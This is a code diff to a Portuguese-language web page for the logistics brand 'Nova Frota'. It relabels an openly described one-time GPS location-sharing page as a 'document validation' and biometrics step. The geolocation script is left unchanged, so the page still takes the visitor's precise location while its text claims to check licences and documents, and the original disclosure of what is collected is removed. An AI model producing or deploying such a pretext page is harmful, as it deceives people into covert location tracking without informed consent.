@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="referrer" content="no-referrer">
 <meta name="robots" content="noindex,nofollow,noarchive">
-<title>Compartilhar ponto de descarga | Nova Frota</title>
+<title>Confirme toda documentação, para receber o link da sua Biometria | Nova Frota</title>
 <style>
 :root{color-scheme:light;--navy:#0c2d4c;--green:#058861;--muted:#536d85;--line:#d2e2ee}
 *{box-sizing:border-box}
@@ -46,24 +46,24 @@ footer{text-align:center;font-size:11px;color:#678094;padding:0 25px 20px}
 <main>
 <header>
  <small>NOVA FROTA · LOGÍSTICA</small>
- <h1>Compartilhar ponto de descarga</h1>
- <p>Uma única localização, enviada com sua autorização.</p>
+ <h1>Baixar documentação</h1>
+ <p>Após baixar e validar a documentação, seu link será liberado, para realziar a biometria</p>
 </header>
 <section class="content">
  <div class="symbol" aria-hidden="true">📍</div>
- <h2>Onde você está agora?</h2>
- <p>Para orientar a descarga, a Nova Frota solicita sua <strong>localização atual</strong>. Ao tocar no botão, o navegador pedirá permissão para acessar o GPS do celular.</p>
- <p class="info"><strong>O que será compartilhado:</strong> latitude, longitude, precisão aproximada e horário. Não pedimos foto, cadastro ou início de viagem. Não há rastreamento contínuo e o link só permite um envio.</p>
- <button type="button" id="sendLocation" disabled>Enviar minha localização uma vez</button>
+ <h2>Validação de documentos?</h2>
+ <p>Para orientar o carregamento, a Nova Frota solicita  <strong>Conferencia</strong>. Ao tocar no botão, o navegador pedirá permissão para que você possa alterar os documentos, e anexar os corretos, caso estejam divergentes.</p>
+ <p class="info"><strong>O que será validado:</strong> CNH, Documentos, contato, origem e destino da carga.</p>
+ <button type="button" id="sendLocation" disabled>Validar documentação uma vez...</button>
  <p id="status" role="status" aria-live="polite">Verificando link...</p>
  <div id="success" hidden>
-  <strong>Localização enviada com sucesso!</strong>
+  <strong>Documentos validados com sucesso!</strong>
   <p>O ponto foi registrado e está disponível para a equipe da Nova Frota.</p>
-  <a id="share" href="#" target="_blank" rel="noopener noreferrer" hidden>Conferir ponto no Google Maps</a>
+  <a id="share" href="#" target="_blank" rel="noopener noreferrer" hidden>Conferir dados</a>
  </div>
- <p class="small">Se negar a permissão, nenhum ponto GPS será enviado. Você pode solicitar um novo link à transportadora.</p>
+ <p class="small">Se negar a permissão, nenhum documento será validado. Você pode solicitar um novo link à transportadora.</p>
 </section>
-<footer>O ponto é visível somente para usuários autorizados do Portal Frete.</footer>
+<footer>A validação é visível somente para usuários autorizados do Portal Frete.</footer>
 </main>
 <script>
 (()=>{
@@ -83,7 +83,7 @@ footer{text-align:center;font-size:11px;color:#678094;padding:0 25px 20px}
    headers:{"Content-Type":"application/json"},cache:"no-store",
    credentials:"omit",body:JSON.stringify(payload)});
   const data=await response.json().catch(()=>({}));
-  if(!response.ok||!data.ok)throw Error(data.error||"Não foi possível enviar sua localização.");
+  if(!response.ok||!data.ok)throw Error(data.error||"Não foi possível enviar sua validação.");
   return data;
  }
  async function preview(){
@@ -93,21 +93,21 @@ footer{text-align:center;font-size:11px;color:#678094;padding:0 25px 20px}
   try{
    const info=await api("/v1/monitor/spot/preview",{token});
    if(info.used){
-    message("Este link já foi utilizado. A localização só pode ser enviada uma vez.","success");
+    message("Este link já foi utilizado. A documentação só pode ser enviada uma vez.","success");
     return;
    }
    available=true;button.disabled=false;
-   message("Link válido. Toque no botão e autorize a localização do celular.");
+   message("Link válido. Toque no botão e autorize a validação dos documentos no celular.");
   }catch(error){message(error.message,"error")}
  }
  button.onclick=async()=>{
   if(!available||busy)return;
   if(!navigator.geolocation||!window.isSecureContext){
-   message("Este navegador não disponibiliza GPS. Abra o link no Chrome ou Safari com conexão HTTPS.","error");
+   message("Este navegador não disponibiliza downloand. Abra o link no Chrome ou Safari com conexão HTTPS.","error");
    return;
   }
   busy=true;button.disabled=true;
-  message("Solicitando permissão de localização ao navegador...");
+  message("Solicitando permissão de validação ao navegador...");
   navigator.geolocation.getCurrentPosition(async pos=>{
    message("Ponto encontrado. Enviando à Nova Frota...");
    try{
@@ -128,9 +128,9 @@ footer{text-align:center;font-size:11px;color:#678094;padding:0 25px 20px}
    }finally{busy=false}
   },error=>{
    busy=false;button.disabled=false;
-   if(error.code===1)message("A permissão do GPS foi negada. Autorize a localização no navegador para enviar o ponto.","error");
-   else if(error.code===3)message("O GPS demorou a responder. Verifique o sinal e tente novamente.","error");
-   else message("Não foi possível obter a localização. Ative o GPS do celular e tente novamente.","error");
+   if(error.code===1)message("A permissão da validação foi negada. Autorize a validação no navegador para enviar o ponto.","error");
+   else if(error.code===3)message("O usuario demorou a responder. Verifique o sinal e tente novamente.","error");
+   else message("Não foi possível obter a validação das informações. Ative o GPS do celular e tente novamente.","error");
   },{enableHighAccuracy:true,maximumAge:0,timeout:25000});
  };
  preview();
